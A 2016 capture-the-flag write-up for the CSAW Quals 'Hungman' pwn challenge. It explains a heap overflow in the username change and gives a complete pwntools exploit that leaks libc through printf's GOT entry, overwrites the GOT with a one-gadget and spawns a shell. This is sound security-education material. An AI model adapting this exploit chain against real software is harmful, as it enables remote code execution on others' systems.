---
layout: post
redirect_from:
  - /blog/2016/09/19/csaw-quals-2016-hungman/
date: "2016-09-19T22:10:02+09:00"
tags: [ "ctf", "writeup", "csaw-ctf", "pwn" ]
---

# CSAW Quals CTF 2016: Hungman

## solution

There is a buffer overflow on heap, about the username.

1.  get high score
2.  overwrite the pointer to the username using the bof of username
3.  GOT overwrite

``` c
struct state_t {
    int size; // 0x4
    char *username; // 0x8
    char opened[]; // bits, 0x10
}; // 0x80
```

``` c
void hungman(game_t *game, int urandom_fd) {
    ...
    if (...) {
        puts("High score! change name?");
        scanf(" %c", &c);
        if (c == 'y') {
            char *buf = malloc(0xf7);
            int len = read(0, buf, 0xf7);
            strchr(buf, '\n') ...
            strcpy(game->username, buf, len);
            free(buf);
        }
    }
    ...
}
```

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='pwn.chal.csaw.io')
parser.add_argument('port', nargs='?', default=8003, type=int)
args = parser.parse_args()
context.log_level = 'debug'

elf = ELF('./hungman')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote(args.host, args.port)

def welcome(name):
    assert p.recvline().rstrip() == "What's your name?"
    p.sendline(name)
    assert p.recvline().startswith('Welcome ')

def play(n=26):
    for c in string.ascii_lowercase[: n] + 'AAA':
        while True:
            s = p.recvline()
            if s.count('_'):
                p.sendline(c)
                break
            elif s.strip() == 'nope':
                continue
            else:
                p.unrecv(s)
                return

def change_name(name):
    s = p.recvline()
    assert s.startswith('High score! change name?')
    p.sendline('y')
    p.send(name)

def read_name():
    p.recvuntil('Highest player: ')
    return p.recvuntil(' score: ', drop=True)

def continue_q(c):
    p.recvuntil('Continue? ')
    p.sendline(c)

length = 0x40
overwrite = lambda addr: 'A' * length + p64(0) + p64(0x91) + p32(length + 1) + p32(64) + p64(addr)
one_gadget_rce = 0xf0897 # https://kimiyuki.net/blog/2016/09/16/one-gadget-rce-ubuntu-1604/

welcome('A' * length)
play()
change_name(overwrite(elf.got['printf']))
s = read_name()
libc_base = u64(s.ljust(8, '\0')) - libc.symbols['printf']
log.info('libc base: %#x', libc_base)

continue_q('y')
play()

change_name(p64(libc_base + one_gadget_rce))

time.sleep(1)
p.sendline('id')
p.interactive()
```
